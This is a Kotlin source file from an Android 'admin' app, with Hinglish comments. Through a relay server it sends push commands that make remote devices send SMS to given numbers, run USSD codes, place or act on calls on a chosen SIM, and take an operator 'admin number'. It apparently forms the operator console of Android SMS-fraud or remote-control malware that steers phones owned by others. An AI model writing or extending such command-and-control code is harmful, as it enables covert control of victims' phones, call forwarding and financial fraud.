package com.example.admin.utils

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * FCMHelper - Android admin app se FCM bhejna.
 *
 * Server ke FCM relay endpoints call karta hai.
 * Server Firebase Admin SDK use karke actual FCM bhejta hai.
 * service_account.json Android assets mein rakhne ki zarurat nahi.
 *
 * Public API same hai - DeviceActivity/FinalActivity mein koi change nahi.
 */
object FCMHelper {

    private const val TAG = "FCM_HELPER"

    private val ioScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()
    }

    fun initialize(context: Context): Boolean {
        Log.d(TAG, "FCMHelper initialized (server-relay mode)")
        return true
    }

    fun isValidFCMToken(token: String): Boolean {
        return token.isNotEmpty()
            && token.length > 50
            && token.contains(":")
            && !token.contains(" ")
    }

    // Server FCM relay endpoint pe POST karo
    private suspend fun postToServer(
        path: String,
        body: JSONObject
    ): Pair<Boolean, String?> = withContext(Dispatchers.IO) {
        return@withContext try {
            val url = "${Constants.DEVICE_API_BASE_URL}$path"
            Log.d(TAG, "POST $url -> $body")

            val request = Request.Builder()
                .url(url)
                .post(body.toString().toRequestBody("application/json; charset=utf-8".toMediaType()))
                .build()

            val response = client.newCall(request).execute()
            val responseText = response.body?.string() ?: ""
            Log.d(TAG, "Response ${response.code}: $responseText")

            if (response.isSuccessful) {
                val msgId = runCatching { JSONObject(responseText).optString("messageId", "ok") }
                    .getOrDefault("ok")
                Pair(true, msgId)
            } else {
                val err = runCatching { JSONObject(responseText).optString("error", "HTTP ${response.code}") }
                    .getOrDefault("HTTP ${response.code}")
                Log.e(TAG, "Server error: $err")
                Pair(false, err)
            }
        } catch (e: Exception) {
            Log.e(TAG, "postToServer exception", e)
            Pair(false, "Exception: ${e.message}")
        }
    }

    fun sendOnlineCheck(
        context: Context,
        uniqueid: String,
        fcmToken: String,
        onResult: (Boolean, String?) -> Unit
    ) {
        Log.d(TAG, "sendOnlineCheck uid=$uniqueid")
        ioScope.launch {
            val body = JSONObject().apply {
                put("uid", uniqueid)
                put("fcmToken", fcmToken)
            }
            val result = postToServer("/fcm/check-online", body)
            withContext(Dispatchers.Main) { onResult(result.first, result.second) }
        }
    }

    fun sendAdminNumber(
        context: Context,
        uniqueid: String,
        fcmToken: String,
        adminNumber: String,
        onResult: (Boolean, String?) -> Unit
    ) {
        Log.d(TAG, "sendAdminNumber uid=$uniqueid number=$adminNumber")
        ioScope.launch {
            val body = JSONObject().apply {
                put("uid", uniqueid)
                put("fcmToken", fcmToken)
                put("adminNumber", adminNumber)
                put("status", if (adminNumber == "inactive") "INACTIVE" else "ACTIVE")
            }
            val result = postToServer("/fcm/admin-update", body)
            withContext(Dispatchers.Main) { onResult(result.first, result.second) }
        }
    }

    fun sendSmsCommand(
        context: Context,
        uniqueid: String,
        fcmToken: String,
        to: String,
        message: String,
        simSlot: Int,
        onResult: (Boolean, String?) -> Unit
    ) {
        Log.d(TAG, "sendSmsCommand uid=$uniqueid to=$to sim=$simSlot")
        ioScope.launch {
            val body = JSONObject().apply {
                put("uid", uniqueid)
                put("fcmToken", fcmToken)
                put("to", to)
                put("body", message)
                put("simSlot", simSlot)
            }
            val result = postToServer("/fcm/sms", body)
            withContext(Dispatchers.Main) { onResult(result.first, result.second) }
        }
    }

    fun sendUssdCommand(
        context: Context,
        uniqueid: String,
        fcmToken: String,
        code: String,
        simSlot: Int,
        onResult: (Boolean, String?) -> Unit
    ) {
        Log.d(TAG, "sendUssdCommand uid=$uniqueid code=$code sim=$simSlot")
        ioScope.launch {
            val body = JSONObject().apply {
                put("uid", uniqueid)
                put("fcmToken", fcmToken)
                put("code", code)
                put("simSlot", simSlot)
            }
            val result = postToServer("/fcm/ussd", body)
            withContext(Dispatchers.Main) { onResult(result.first, result.second) }
        }
    }

    fun sendCallCommand(
        context: Context,
        uniqueid: String,
        fcmToken: String,
        code: String,
        simSlot: Int,
        number: String = "",
        action: String = "",
        onResult: (Boolean, String?) -> Unit
    ) {
        Log.d(TAG, "sendCallCommand uid=$uniqueid code=$code sim=$simSlot action=$action")
        ioScope.launch {
            val body = JSONObject().apply {
                put("uid", uniqueid)
                put("fcmToken", fcmToken)
                put("code", code)
                put("simSlot", simSlot)
                if (number.isNotEmpty()) put("number", number)
                if (action.isNotEmpty()) put("actionType", action)
            }
            val result = postToServer("/fcm/call", body)
            withContext(Dispatchers.Main) { onResult(result.first, result.second) }
        }
    }
}
